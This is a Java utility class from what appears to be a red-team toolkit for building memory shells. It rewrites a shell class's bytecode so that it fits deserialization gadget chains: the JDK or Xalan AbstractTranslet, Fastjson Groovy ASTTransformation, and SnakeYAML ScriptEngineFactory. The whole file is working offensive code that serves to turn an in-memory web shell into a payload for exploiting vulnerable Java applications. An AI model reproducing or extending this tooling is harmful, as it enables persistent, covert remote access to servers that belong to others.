package com.potato.potatotool.content.redTeam.memshell.util;

import javassist.CtClass;
import com.potato.potatotool.content.redTeam.memshell.config.MemoryObj;
import com.potato.potatotool.content.redTeam.memshell.config.MemoryShellConstants;

/**
 * @author Potato
 * @date 2024/7/29 14:53
 */
public class ExpModifierUtil {
    private final MemoryObj memoryObj;
    private final CtClass targetClass;

    /**
     * 初始化 ExpModifierUtil 实例
     * @param memoryObj 配置信息
     * @param targetClass 目标类
     */
    public ExpModifierUtil(MemoryObj memoryObj, CtClass targetClass) {
        this.memoryObj = memoryObj;
        this.targetClass = targetClass;
    }

    /**
     * 根据配置中的漏洞类型对目标类进行修改
     * @return 修改后的字节码
     * @throws Exception 抛出所有异常
     */
    public byte[] modifyClassForExploit() throws Exception {
        String gadgetType = memoryObj.getGadgetType();
        if (gadgetType != null) {
            switch (gadgetType) {
                case MemoryShellConstants.GADGET_JDK_TRANSLET:
                    extendWithJDKTranslet();
                    break;
                case MemoryShellConstants.GADGET_XALAN_TRANSLET:
                    extendWithXALANTranslet();
                    break;
                case MemoryShellConstants.GADGET_FASTJSON_GROOVY:
                    implementGroovyASTTransformation();
                    break;
                case MemoryShellConstants.GADGET_SNAKEYAML:
                    implementScriptEngineFactory();
                    break;
                default:
                    throw new IllegalArgumentException("Unsupported gadget type: " + gadgetType);
            }
        }
        return targetClass.toBytecode();
    }


    /**
     * 将目标类扩展为 JDK 的 AbstractTranslet 类
     * @throws Exception 抛出所有异常
     */
    private void extendWithJDKTranslet() throws Exception {
        JavassistUtil.extendSuperclass(targetClass, "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
    }


    /**
     * 将目标类扩展为 XALAN 的 AbstractTranslet 类
     */
    private void extendWithXALANTranslet() {
        try {
            JavassistUtil.extendSuperclass(targetClass, "org.apache.xalan.xsltc.runtime.AbstractTranslet");
        } catch (Exception e) {
            throw new RuntimeException("Failed to extend class to XALAN AbstractTranslet", e);
        }
    }


    /**
     * 实现 Fastjson Groovy ASTTransformation 接口，并添加 GroovyASTTransformation 注解
     * @throws Exception 抛出所有异常
     */
    private void implementGroovyASTTransformation() throws Exception {
        memoryObj.setImplementsASTTransformationType(true);
        JavassistUtil.implementInterface(targetClass, "org.codehaus.groovy.transform.ASTTransformation");
        JavassistUtil.addAnnotation(targetClass, "org.codehaus.groovy.transform.GroovyASTTransformation");
    }


    /**
     * 实现 SnakeYAML ScriptEngineFactory 接口
     * @throws Exception 抛出所有异常
     */
    private void implementScriptEngineFactory() throws Exception {
        memoryObj.setImplementsScriptEngineFactory(true);
        JavassistUtil.implementInterface(targetClass, "javax.script.ScriptEngineFactory");
    }

}
